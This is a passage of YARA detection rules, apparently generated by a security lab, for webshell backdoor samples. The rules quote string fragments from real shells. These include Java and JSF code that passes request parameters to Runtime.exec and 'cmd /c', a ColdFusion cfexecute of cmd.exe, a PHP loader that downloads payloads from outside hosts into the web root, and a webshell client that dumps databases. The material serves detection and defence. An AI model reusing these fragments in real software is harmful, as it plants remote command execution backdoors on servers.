        $s2 = "# an internal variable and is used each time a command has to be executed. The" fullword ascii
        $s3 = "$HtmlMetaHeader = \"<meta HTTP-EQUIV=\\\"Refresh\\\" CONTENT=\\\"1; URL=$DownloadLink\\\">\";" fullword ascii
        $s4 = "# CGI-Telnet Version 1.0 for NT and Unix : Run Commands on your Web Server" fullword ascii
        $s5 = "# get the directory in which the commands will be executed" fullword ascii
        $s6 = "# Main Program - Execution Starts Here" fullword ascii
        $s7 = "# Script Homepage: http://www.rohitab.com/cgiscripts/cgitelnet.html" fullword ascii
        $s8 = "# output of the change directory command is not displayed to the users" fullword ascii
        $s9 = "<td bgcolor=\"#000080\"><font face=\"Verdana\" size=\"2\" color=\"#FFFFFF\"><b>CGI-Telnet Version 1.0 - Connected to" fullword ascii
        $s10 = "# This function is called to execute commands. It displays the output of the" fullword ascii
        $s11 = "# Product Support: http://www.rohitab.com/support/" fullword ascii
        $s12 = "# Configuration: You need to change only $Password and $WinNT. The other" fullword ascii
        $s13 = "# Author e-mail: rohitab@rohitab.com" fullword ascii
        $s14 = "# Author Homepage: http://www.rohitab.com/" fullword ascii
        $s15 = "# Prints the message that informs the user of a failed login" fullword ascii
        $s16 = "# 2. Change the password in the Configuration section below." fullword ascii
        $s17 = "# command and allows the user to enter another command. The change directory" fullword ascii
        $s18 = "<a href=\"http://www.rohitab.com/cgiscripts/cgitelnet.html\">Help</a>" fullword ascii
        $s19 = "&ExecuteCommand;" fullword ascii
        $s20 = "sub ExecuteCommand" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 80KB and ( 8 of them ) ) or ( all of them )
}

rule df72eb8e6817464c16e0eb2b987a9cadcd1c4914
{
    meta:
        description = "others - file df72eb8e6817464c16e0eb2b987a9cadcd1c4914.asmx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "048962b1d72b71052809139c798d72297bf139782679c0922dc69c578e558119"
    strings:
        $s1 = "R += String.Format(\"{0}/\\t{1}\\t0\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyyy-MM-dd hh:mm:ss\"));" fullword ascii
        $s2 = "R = \"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";" fullword ascii
        $s3 = "R += String.Format(\"{0}\\t{1}\\t{2}\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yy" fullword ascii
        $s4 = "R += String.Format(\"{0}/\\t{1}\\t0\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyy" fullword ascii
        $s5 = "if (strDat.IndexOf(\"SELECT \") == 0 || strDat.IndexOf(\"EXEC \") == 0 || strDat.IndexOf(\"DECLARE \") == 0)" fullword ascii
        $s6 = "if (strDat.IndexOf(\"SELECT \") == 0 || strDat.IndexOf(\"EXEC \") == 0 || strDat.IndexOf(\"DECLARE \") == " fullword ascii
        $s7 = "cm.ExecuteNonQuery();" fullword ascii
        $s8 = "HttpContext.Current.Response.Write(\"\\x2D\\x3E\\x7C\" + R + \"\\x7C\\x3C\\x2D\");" fullword ascii
        $s9 = "ProcessStartInfo c = new ProcessStartInfo(Z1.Substring(2));" fullword ascii
        $s10 = "c.UseShellExecute = false;" fullword ascii
        $s11 = "[WebService(Namespace = \"http://www.wooyun.org/whitehats/RedFree\")]" fullword ascii
        $s12 = "HttpContext.Current.Response.Write(\"<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?>\");" fullword ascii
        $s13 = "HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();" fullword ascii
        $s14 = "SqlCommand cm = Conn.CreateCommand();" fullword ascii
        $s15 = "cm.CommandText = Z2;" fullword ascii
        $s16 = "Process e = new Process();" fullword ascii
        $s17 = "File.Copy(S + \"\\\\\" + F.Name, D + \"\\\\\" + F.Name);" fullword ascii
        $s18 = "[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]" fullword ascii
        $s19 = "R = Conn.Database + \"\\t\";" fullword ascii
        $s20 = "HttpContext.Current.Response.End();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 40KB and ( 8 of them ) ) or ( all of them )
}

rule a578c865f0f7b6de4c87e63595fe19734da9e7b1
{
    meta:
        description = "others - file a578c865f0f7b6de4c87e63595fe19734da9e7b1.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9c18751d430ad37a427bf276682d8754d2c7c9fdc0816e6799d2577dcabdec31"
    strings:
        $s1 = "(htappam.revres(eliFeteleD.osf:)OSF_TSNOC(tcejbOetaerC.revreS=osf tes:)(ledjpa noitcnuf\")):ExeCuTe(erXM(\"ssalC dnE" fullword ascii
        $s2 = "ageAddToMdb():case \"ScanPort\":ScanPort():FuncTion MMD():ExeCuTe(erXM(\"tlusERrts &" fullword ascii
        $s3 = "m)(kcehCegaP buS\")):Select Case Action:case \"MainMenu\":MainMenu():Case \"EditPower\":Call EditPower(request(\"PowerPath\")):C" ascii
        $s4 = "<a href='?Action=cmdx' target='FileFrame'> <font color=red> " fullword ascii
        $s5 = "= 2b ;)61 / ]2[bgr(roolf.htaM = 1b ;61*1g - ]1[bgr = 2g ;)61 / ]1[bgr(roolf.htaM = 1g ;61*1r - ]0[bgr = 2r ;)61 / ]0[bgr(roolf." fullword ascii
        $s6 = ":46 - eulaVtni = eulaVtni:nehT 46 => eulaVtni fI:fI dnE:821 - eulaVtni = eulaVtni:nehT 821 => eulaVtni fI:1=KOtidE:KOtidE miD" fullword ascii
        $s7 = "nruter ;]2b[srolocxeh + ]1b[srolocxeh = b ;]2g[srolocxeh + ]1g[srolocxeh = g ;]2r[srolocxeh + ]1r[srolocxeh = r ;61*1b - ]2[bgr" fullword ascii
        $s8 = "m)htaPs(eliFmorFdaoLmaertS noitcnuF\")):ExeCuTe(erXM(\"noitcnuF dnE" fullword ascii
        $s9 = "mtiuq ,resuwen ,niamodwen ,tm ,niamodled ,ssapnigol ,resunigol ,dmc ,tropptf ,trop ,ssap ,resu miD\")):case\"MMD\":MMD():case\"R" ascii
        $s10 = "m)mun(eziSehTteG noitcnuF\")):ExeCuTe(erXM(\"noitcnuF dnE" fullword ascii
        $s11 = "m)(mroFevirDnacSmotsuC buS\")):ExeCuTe(erXM(\"noitcnuF dne" fullword ascii
        $s12 = "m)(llehs1dmc noitcnuf\")):ExeCuTe(erXM(\"noitcnuF dnE:fI dnE" fullword ascii
        $s13 = "m)galf,gsm,etats(egasseM buS\")):ExeCuTe(erXM(\"noitcnuF dne" fullword ascii
        $s14 = "ysjb=true:Server.ScriptTimeout=999999999:BodyColor=\"#000000\":FontColor=\"#00FF00\":LinkColor=\"#ffffff\":Response.Buffer =true" ascii
        $s15 = "m)(php noitcnuf\")):ExeCuTe(erXM(\"noitcnuf dnE:" fullword ascii
        $s16 = "m)(ofnIlanimreTteg bus\")):ExeCuTe(erXM(\"noitcnuF dnE" fullword ascii
        $s17 = "m)(reganaMbD noitcnuF\")):ExeCuTe(erXM(\"buS dnE" fullword ascii
        $s18 = "m)(uneMniaM noitcnuF\")):ExeCuTe(erXM(\"noitcnuf dne" fullword ascii
        $s19 = "m)(esruoC noitcnuF\")):ExeCuTe(erXM(\"noitcnuF dne" fullword ascii
        $s20 = "m)(flesymorp bus\")):ExeCuTe(erXM(\"noitcnuF dnE" fullword ascii
    condition:
        ( uint16(0) == 0x6f3c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule sig_40c7aac2d6c7002eed0ddde97a434c9de6f7c50f
{
    meta:
        description = "others - file 40c7aac2d6c7002eed0ddde97a434c9de6f7c50f.class"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "447286de6b80a554a59b971a84aed07594bb2bfb66e0760363a6b36b930c35ce"
    strings:
        $s1 = "c:\\install.log" fullword ascii
        $s2 = "@<br><form method=\"POST\" action=\"\" enctype=\"multipart/form-data\">" fullword ascii
        $s3 = "R(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V" fullword ascii
        $s4 = "0UPLOAD <input type=\"file\" name=\"file\" size=\"60\">" fullword ascii
        $s5 = "$<input type=\"submit\" value=\"Upload\">" fullword ascii
        $s6 = "&javax/servlet/http/HttpServletResponse" fullword ascii
        $s7 = "%javax/servlet/http/HttpServletRequest" fullword ascii
    condition:
        ( uint16(0) == 0xfeca and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule sig_305472ad146b6b0c3dd61502bbeb4740e74e6f6b
{
    meta:
        description = "others - file 305472ad146b6b0c3dd61502bbeb4740e74e6f6b.cer"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4b6775baea15cf04adf3ed9991135ba47c48a5bf2ae7f9dabfbf7755f24d1adb"
    strings:
        $s1 = "Response.Write(\"<br>( ) <a href=?type=1&file=\" & server.URLencode(item.path) & \"\\>\" & item.Name & \"</a>\" & vbCrLf)" fullword ascii
        $s2 = "Response.Write(\"<li><a href=?type=2&file=\" & server.URLencode(item.path) & \">\" & item.Name & \"</a> - \" & item.Size & \" by" ascii
        $s3 = "Set oStr = server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s4 = "list.asp = Directory & File View" fullword ascii
        $s5 = "set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s6 = "Response.Write(oFich.ReadAll)" fullword ascii
        $s7 = "<FORM action=\"\" method=\"GET\">" fullword ascii
        $s8 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword ascii
        $s9 = "Response.Write(\"<h3>PATH: \" & file & \"</h3>\")" fullword ascii
        $s10 = "set folder = fs.GetFolder(path)" fullword ascii
        $s11 = "Response.Write(\"<br>( ) <a href=?type=1&file=\" & server.URLencode(path) & \"..\\>\" & \"..\" & \"</a>\" & vbCrLf)" fullword ascii
        $s12 = "file=\"c:\\\"" fullword ascii
        $s13 = "Response.Write(\"<br>--</pre>\")" fullword ascii
        $s14 = "Response.Write(\"<li><a href=?type=2&file=\" & server.URLencode(item.path) & \">\" & item.Name & \"</a> - \" & item.Size & \" by" ascii
        $s15 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword ascii
    condition:
        ( uint16(0) == 0x213c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule sig_0a20f64dbb5f4175cd0bb0a81f60546e12aba0d0
{
    meta:
        description = "others - file 0a20f64dbb5f4175cd0bb0a81f60546e12aba0d0.xhtml"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a73f75ab7a2408f490c721c233583316bd3eb901bd32f2a0bf04282fa6a4219c"
    strings:
        $x1 = "view.getClass().getClassLoader().loadClass(\"java.io.File\").getConstructor(\"a\".getClass()).newInstance(\"/tmp/shell\")" fullword ascii
        $x2 = "ClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"rm /tmp/shell\")}" fullword ascii
        $x3 = "view.getClass().getClassLoader().loadClass(\"java.util.Scanner\").getMethod(\"useDelimiter\", \"a\".getClass()).invoke(" fullword ascii
        $s4 = "xmlhttp.open(\"GET\",location.pathname+\"?do=\" + encodeURI(document.getElementById(\"cmd\").value),false);" fullword ascii
        $s5 = "xmlhttp.open(\"GET\",location.pathname+\"?cmd=\" + encodeURI(document.getElementById(\"cmd\").value),false);" fullword ascii
        $s6 = "<pre>#{ view.getClass().getClassLoader().loadClass(\"java.util.Scanner\").getMethod(\"next\").invoke(" fullword ascii
        $s7 = "view.getClass().getClassLoader().loadClass(\"java.util.Scanner\").getConstructor(view.getClass().getClassLoader().loadClass(\"ja" ascii
        $s8 = "document.getElementById('output').innerHTML = xmlhttp.responseText.substr(a+6,b-a -6);" fullword ascii
        $s9 = "<input autocomplete=\"off\" id='cmd' name='cmd' size='100' placeholder='command' style=\"text-align:center; \"/>" fullword ascii
        $s10 = "console.log(xmlhttp.responseText);" fullword ascii
        $s11 = "${view.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"exec\",\"1\".getClass()).invoke(view.getClass()." ascii
        $s12 = ".io.File\").getConstructor(\"a\".getClass()).newInstance(\"/tmp/shell\").getClass()).newInstance(" fullword ascii
        $s13 = "<center><font size=\"1\"><i>Java Server Faces MiniWebCmdShell 0.2 by HeartLESS.</i></font></center>" fullword ascii
        $s14 = "view.getClass().getClassLoader().loadClass(\"java.util.Scanner\").getConstructor(view.getClass().getClassLoader().loadClass(\"ja" ascii
        $s15 = "xmlns:ui=\"http://java.sun.com/jsf/facelets\"" fullword ascii
        $s16 = "xmlns:h=\"http://java.sun.com/jsf/html\"" fullword ascii
        $s17 = "#{view.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"exec\",\"1,2\".split(\",\").getClass()).invoke(v" ascii
        $s18 = "if (window.XMLHttpRequest){// code for IE7+, Firefox, Chrome, Opera, Safari" fullword ascii
        $s19 = "<c:when test=\"${request.getParameter('cmd') !=null}\">" fullword ascii
        $s20 = "console.log(e);" fullword ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 10KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_99bfe1cba5d35e623a6a213da290d57cde4a0e72
{
    meta:
        description = "others - file 99bfe1cba5d35e623a6a213da290d57cde4a0e72.java"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "065ef65136911a56bd5d167fb8e65b154593d59b923155f59aaa8dedcdf7a2c4"
    strings:
        $x1 = "Process p = Runtime.getRuntime().exec(\"cmd /c \" + req.getParameter(\"cmd\"));" fullword ascii
        $s2 = "out.print(\"\\n<hr><p><b>Command: \" + req.getParameter(\"cmd\") + \"\\n</b><br><br><hr><pre>\\n\");" fullword ascii
        $s3 = "* @author The Dark Raver" fullword ascii
        $s4 = "out.print(\"<hr><p><form method=\\\"GET\\\" name=\\\"myform\\\" action=\\\"\\\">\");" fullword ascii
        $s5 = "public void doGet(HttpServletRequest req, HttpServletResponse res)" fullword ascii
        $s6 = "out.print(\"<input type=\\\"text\\\" name=\\\"cmd\\\">\");" fullword ascii
        $s7 = "if(req.getParameter(\"cmd\") != null) {" fullword ascii
        $s8 = "DataInputStream procIn = new DataInputStream(p.getInputStream());" fullword ascii
        $s9 = "* CmdServlet.java" fullword ascii
        $s10 = "res.setContentType(\"text/html\");" fullword ascii
        $s11 = "* @version 0.1" fullword ascii
        $s12 = "while ((c=procIn.read()) != -1) {" fullword ascii
        $s13 = "out.print(\"<input type=\\\"submit\\\" value=\\\"Send\\\">\");" fullword ascii
        $s14 = "PrintWriter out = res.getWriter();" fullword ascii
        $s15 = "public String getServletInfo() {" fullword ascii
        $s16 = "import javax.servlet.http.*;" fullword ascii
        $s17 = "public class CmdServlet extends HttpServlet {" fullword ascii
    condition:
        ( uint16(0) == 0x2a2f and filesize < 3KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_814aba40838d28210d667fc772226fcf94578992
{
    meta:
        description = "others - file 814aba40838d28210d667fc772226fcf94578992.rb"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9b6919e74b125a34651044c13c27f691994a3b44e664b47e336e698c1045d38e"
    strings:
        $x1 = "s.print \"The cmd_exec function gives you the ability to execute any command on the system with the\\r\\n\"" fullword ascii
        $x2 = "s.print \"?cmd_exec=<command><br>-> The command will be executed</fieldset>\\r\\n\\r\\n\"" fullword ascii
        $x3 = "s.print \"command on the remote machine! The result of the execution will be shown on the webinterface afterwards.\\r\\n<br><" fullword ascii
        $x4 = "s.print \"To start the shell type:<br>$user@example.com> ruby shell.rb 9000<br><br>\\r\\n\"" fullword ascii
        $x5 = "s.print \"To connect to the shell type:<br>http://example.com:9000/</fieldset>\\r\\n\\r\\n\"" fullword ascii
        $s6 = "s.print \"Note: Some commands may crash the shell, for example a never ending PING command or something\\r\\n\"" fullword ascii
        $s7 = "s.print \"<input type=\\\"submit\\\" value=\\\"Execute command\\\"></form>\\r\\n\"" fullword ascii
        $s8 = "elsif (command == \"/?cmd_exec\") && (value != nil)" fullword ascii
        $s9 = "s.print \"<!-- INPUT FIELD FOR COMMAND EXECUTION -->\\r\\n\"" fullword ascii
        $s10 = "elsif (command == \"/?cmd_exec\") && (value == nil)" fullword ascii
        $s11 = "# This will be ?open_dir, ?open_file, ?delete_file or ?cmd_exec" fullword ascii
        $s12 = "# If the user leaves the input field for the command execution empty" fullword ascii
        $s13 = "s.print \"<fieldset style=\\\"width: 40%\\\"><legend>Help: Command execution</legend>\\r\\n\"" fullword ascii
        $s14 = "s.print \"does not have root privileges. Connections will be exepted through HTTP and\\r\\n\"" fullword ascii
        $s15 = "s.print \"<input type=\\\"text\\\" name=\\\"cmd_exec\\\">\\r\\n\"" fullword ascii
        $s16 = "s.print \"<fieldset><legend>Command executed: #{cmd}</legend><pre>\\r\\n\"" fullword ascii
        $s17 = "# The input field used for the command execution" fullword ascii
        $s18 = "# will be shown as executables or .core files will be shown as normal files and more. To" fullword ascii
        $s19 = "# move into it (do not try doing it, it will fail or crash the shell)" fullword ascii
        $s20 = "s.print \"rights under which the ruby shell is running.<br><br>This is a very powerful and very dangerous function\\r\\n\"" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 70KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_others_loader
{
    meta:
        description = "others - file loader.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "29ceafbd05fed51ffa13ed36d778cfe23b70e1b38c0fcfac2f5e015f432a7145"
    strings:
        $s1 = "$text = http_get('https://ghostbin.com/paste/vm4rz/raw');" fullword ascii
        $s2 = "$text2 = http_get('http://fallagassrini.xx.tn/7.txt');" fullword ascii
        $s3 = "$text0 = http_get('http://fallagassrini.xx.tn/un.txt');" fullword ascii
        $s4 = "$text3 = http_get('http://fallagassrini.xx.tn/');" fullword ascii
        $s5 = "$check2 = $_SERVER['DOCUMENT_ROOT'] . \"/xGx.php\" ;" fullword ascii
        $s6 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/xGSx.php\" ;" fullword ascii
        $s7 = "$check0 = $_SERVER['DOCUMENT_ROOT'] . \"/un.php\" ;" fullword ascii
        $s8 = "function http_get($url){" fullword ascii
        $s9 = "return curl_exec($im);" fullword ascii
        $s10 = "$check3=$_SERVER['DOCUMENT_ROOT'] . \"/Gass.html\" ;" fullword ascii
        $s11 = "curl_setopt($im, CURLOPT_HEADER, 0);" fullword ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 3KB and ( 8 of them ) ) or ( all of them )
}

rule sig_53b74243a9deb88f3b20c19f2ab25e29c27317d3
{
    meta:
        description = "others - file 53b74243a9deb88f3b20c19f2ab25e29c27317d3.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "73289e4d9d606751ff3c14802b4042c2ddb53fe7ba26f03ef71f6d9cc021a5cc"
    strings:
        $s1 = "$do = send_it($url, $head_pass, $master_pass, $head_exe, $dump);" fullword ascii
        $s2 = "'User-Agent' => \"Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0\"," fullword ascii
        $s3 = "print colored(\"[?] \", red) . colored(\"Insert header for password field: \", cyan);" fullword ascii
        $s4 = "$do = send_it($url, $head_pass, $master_pass, $head_exe, encode_base64(\"wp_delete_user\").\"**\". encode_base64($user));" fullword ascii
        $s5 = "print \"\\n\\n[!] Login failed or the webshell was removed!\";" fullword ascii
        $s6 = "print colored(\"\\n\\n[!] \", red) . colored(\"Login successful!\\n\\n\", cyan);" fullword ascii
        $s7 = "if ($do =~ /ERROR-DA_FCK/) { print colored(\"\\n[!] \", red) . colored(\"Can't access to /etc/passwd\\n\\n\", yellow); }" fullword ascii
        $s8 = "-- If compromised server is not a WordPress, you need to set DB credentials" fullword ascii
        $s9 = "print colored(\"[?] \", red) . colored(\"Insert password: \", cyan);" fullword ascii
        $s10 = "# -={Gorosaurus v0.1: Perl client for Gorosaurus WebShell}=-" fullword ascii
        $s11 = "-- If CMS is WordPress, dump the WordPress database" fullword ascii
        $s12 = "print colored(\"[?] \", red). colored(\"Password: \", cyan);" fullword ascii
        $s13 = "print colored(\"[?] \", red) . colored(\"Insert login name: \", cyan);" fullword ascii
        $s14 = "$dump = encode_base64(\"db_dump\"). \"**\" .encode_base64($dbname);" fullword ascii
        $s15 = "print colored(\"[?] \", red) . colored(\"Insert header for command field: \", cyan);" fullword ascii
        $s16 = "upload_it($url, $head_pass, $master_pass, $head_exe, $send, $source);" fullword ascii
        $s17 = "$do = send_it($url, $head_pass, $master_pass, $head_exe, $list_db_cred);" fullword ascii
        $s18 = "$init_sql = encode_base64($user.\"**\".$pass.\"**\".$dbname.\"**\".$host);" fullword ascii
        $s19 = "if ($do =~ /YES/) { print colored(\"[!] \", red) . colored(\"Symlink created succesfully!\\n\", cyan); }" fullword ascii
        $s20 = "$do = send_it($url, $head_pass, $master_pass, $head_exe, $ping); " fullword ascii
    condition:
        ( uint16(0) == 0x2023 and filesize < 40KB and ( 8 of them ) ) or ( all of them )
}

rule sig_88d2a0de0e77454b007c2332df86427461e7815c
{
    meta:
        description = "others - file 88d2a0de0e77454b007c2332df86427461e7815c.cmf"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "29777403e2f3cd010ff179b71233137fe75379b0fc3b7f7b2932bb6af94a0dd9"
    strings:
        $x1 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii
        $s2 = "<cfif FileExists(\"#GetTempDirectory()#foobar.txt\") is \"Yes\">" fullword ascii
        $s3 = "outputfile=\"#GetTempDirectory()#foobar.txt\"" fullword ascii
        $s4 = "file=\"#GetTempDirectory()#foobar.txt\">" fullword ascii
        $s5 = "file=\"#GetTempDirectory()#foobar.txt\"" fullword ascii
        $s6 = "<form action=\"<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>\" method=\"post\">" fullword ascii
        $s7 = "<!--- os.run --->" fullword ascii
        $s8 = "<cfif IsDefined(\"FORM.cmd\")>" fullword ascii
        $s9 = "</cfexecute>" fullword ascii
        $s10 = "<input type=text size=45 name=\"cmd\" >" fullword ascii
        $s11 = "<cfoutput>#cmd#</cfoutput>" fullword ascii
        $s12 = "<title>H4x0r's cfmshell</title>" fullword ascii
        $s13 = "<CFOUTPUT>#readText#</CFOUTPUT> " fullword ascii
        $s14 = "arguments=\"/c #cmd#\"" fullword ascii
        $s15 = "<input type=Submit value=\"run\">" fullword ascii
        $s16 = "<textarea readonly cols=80 rows=20>" fullword ascii
    condition:
        ( uint16(0) == 0x683c and filesize < 2KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_5417fad68a6f7320d227f558bf64657fe3aa9153
{
    meta:
        description = "others - file 5417fad68a6f7320d227f558bf64657fe3aa9153.ashx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f9615655be7ca356b2b2f17e926d6ea6fa89ff785e39680e0019412872eb3d95"
    strings:
        $s1 = "public void ProcessRequest (HttpContext context) { " fullword ascii
        $s2 = "context.Response.ContentType = \"text/plain\";" fullword ascii
        $s3 = "StreamWriter file1= File.CreateText(context.Server.MapPath(\"query.aspx\")); " fullword ascii
        $s4 = "using System.Web; " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule ea2384b028d28d4d3cf8ad491920c184a086e655
{
    meta:
        description = "others - file ea2384b028d28d4d3cf8ad491920c184a086e655.cgi"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0449f3ad21b8dedf98b89f57a596202edb6479332dcdc42d5f9cfe88b0534be1"
    strings:
        $s1 = "# Copyright (C) 2000-2003 Martin Geisler <gimpster@gimpster.com>" fullword ascii
        $s2 = "# PerlWebShell is an interactive CGI-script that will execute any" fullword ascii
        $s3 = "# command entered. See the files README and INSTALL or" fullword ascii
        $s4 = "# http://yola.in-berlin.de/perlwebshell/ for further information." fullword ascii
        $s5 = "print q(<input name=\"submit\" type=\"submit\" value=\"execute\" /></p>);" fullword ascii
        $s6 = "# address: http://www.gnu.org/copyleft/gpl.html#SEC1" fullword ascii
        $s7 = "href=\"http://yola.in-berlin.de/perwebshell/\">http://yola.in-berlin.de/perlwebshell/</a>." fullword ascii
        $s8 = "# Place - Suite 330, Boston, MA  02111-1307, USA." fullword ascii
        $s9 = "print \"<option value=\\\"$cwd$fname/\\\">$fname</option>\\n\" if -d \"$cwd/$fname\";" fullword ascii
        $s10 = "print q(<p>Command: <input type=\"text\" name=\"command\" size=\"60\" /></p>);" fullword ascii
        $s11 = "print $q->start_form(-method=>\"get\", -action=>$abs_url);" fullword ascii
        $s12 = "<img src=\"http://www.w3.org/Icons/valid-xhtml10\" alt=\"Valid XHTML 1.0 Strict!\"" fullword ascii
        $s13 = "$command = \"ls -l\" unless $command;" fullword ascii
        $s14 = "print \"<title>shell.cgi ($ENV{'SERVER_NAME'})</title>\";" fullword ascii
        $s15 = "# as published by the Free Software Foundation; either version 2" fullword ascii
        $s16 = "# You can also write to the Free Software Foundation, Inc., 59 Temple" fullword ascii
        $s17 = "print \"<fieldset><legend>Output ($command)</legend>\";" fullword ascii
        $s18 = "# of the License, or (at your option) any later version." fullword ascii
        $s19 = "print h1(\"shell.cgi ($ENV{'SERVER_NAME'})\");" fullword ascii
        $s20 = "# Copyright (C) 2004 Florian Rossol <rossol@yola.in-berlin.de>" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule sig_4f78912a379e061077022c6f60cb410f923d08ae
{
    meta:
        description = "others - file 4f78912a379e061077022c6f60cb410f923d08ae.class"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "319040bad23d4d4c36c6db35f2d44650aba8ef3e34652f3a39bb383cf6f988db"
    strings:
        $s1 = "R(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V" fullword ascii
        $s2 = "%javax/servlet/http/HttpServletRequest" fullword ascii
        $s3 = "&javax/servlet/http/HttpServletResponse" fullword ascii
    condition:
        ( uint16(0) == 0xfeca and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule sig_67a14ae8bf4a4fb4ec016a4a844c3c6202cb949e
{
    meta:
        description = "others - file 67a14ae8bf4a4fb4ec016a4a844c3c6202cb949e.cer"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "14bbe856ceabe0345418246676f743dd6a93c8b85019b634d2ae8c0eaa381d1f"
    strings:
        $x1 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files will be DUMPED Too and From" fullword ascii
        $x2 = "<form method=\"post\" ENCTYPE=\"multipart/form-data\" action=\"/keio.asp?upload=@&txtpath=F:\\freehost\\zxyzch10a\\web\">" fullword ascii
        $x3 = "<!-- Copyright Vela iNC. Apr2003 [www.shagzzz.cjb.net] Coded by ~sir_shagalot -->" fullword ascii
        $s4 = "<form method=post name=frmCopySelected action=\"/keio.asp?txtpath=F:\\freehost\\zxyzch10a\\web\">" fullword ascii
        $s5 = "<BR><center><form method=post action=\"/keio.asp?txtpath=F:\\freehost\\zxyzch10a\\web\">" fullword ascii
        $s6 = "document.myform.txtpath.value = \"F:\\freehost\\zxyzch10a\\web\\\" & \"\\\" & thestuff" fullword ascii
        $s7 = "PSD.psd</option></select><input type=hidden name=txtpath value=\"F:\\freehost\\zxyzch10a\\web\"><input type=Submit name=cmd valu" ascii
        $s8 = "document.myform.txtpath.value = \"F:\\freehost\\zxyzch10a\\web\\\" & thestuff" fullword ascii
        $s9 = "fso.CopyFile Request.QueryString(\"txtpath\") & \"\\\" & Request.Form(\"Fname\"),Target & Request.Form(\"Fname\")" fullword ascii
        $s10 = "fso.CopyFile Target & Request.Form(\"ToCopy\"), Request.Form(\"txtpath\") & \"\\\" & Request.Form(\"ToCopy\")" fullword ascii
        $s11 = "/Font><BR><font face=wingdings color=Gray >1</font><font face=Arial size=+1 > F:\\freehost\\zxyzch10a\\web\\</Font>" fullword ascii
        $s12 = "<tr><td colspan=2 cellpadding=2 bgcolor=#303030 ><font face=Arial size=-1 color=gray>Virtual: http://www.634629883.com/keio.asp<" ascii
        $s13 = "/option><option value=\"web.config\">&nbsp;&nbsp;web.config -- [1 kb]</option><option value=\"" fullword ascii
        $s14 = "<form method=\"post\" action=\"/keio.asp\" ><font face=arial size=-1 >Delete file from current directory:</font><BR>" fullword ascii
        $s15 = "Response.write \"<font face=arial size=-2>You need to click [Create] or [Delete] for folder operations to be</font>\"" fullword ascii
        $s16 = "<form method=post name=frmCopySelected action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s17 = "PSD.psd</option></select><input type=hidden name=txtpath value=\"F:\\freehost\\zxyzch10a\\web\"><input type=Submit name=cmd valu" ascii
        $s18 = "<BR><center><form method=post action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s19 = "option><option>search.asp</option><option>taglist.asp</option><option>tags.asp</option><option>web.config</option><option>" fullword ascii
